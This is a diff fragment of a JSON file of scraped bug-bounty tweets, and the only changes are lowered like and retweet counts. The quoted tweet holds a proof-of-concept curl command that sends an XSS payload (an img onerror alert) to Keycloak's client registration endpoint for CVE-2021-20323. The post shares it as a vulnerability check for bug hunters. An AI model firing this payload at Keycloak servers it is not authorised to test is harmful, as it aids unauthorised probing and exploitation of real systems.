@@ -216,10 +216,10 @@
     "username": "hosselot"
 }
 {
-    "tweetfavorites": 370,
+    "tweetfavorites": 358,
     "tweetquotes": 1,
-    "tweetreplies": 9,
-    "tweetretweets": 122,
+    "tweetreplies": 8,
+    "tweetretweets": 117,
     "tweettext": "Title:-  CVE-2021-20323 - A post based XSS  Keycloak\n\nPOC to verify :- \n\ncurl -v -X POST {BaseURL}/realms/master/clients-registrations/default -H \"Content-type: application/json\" -d \"{\\\"&lt;img src=x onerror=\\\\\\\"alert('XSS')\\\\\\\"/&gt;\\\":1}\"\n\n#BugBounty #bugbountytips #cybersecuritytips https://t.co/nMbdN4dwt8",
     "tweettime": "2023-07-19, 16:45:14",
     "tweeturl": "https://twitter.com/alone_breecher/status/1681706774728933387",
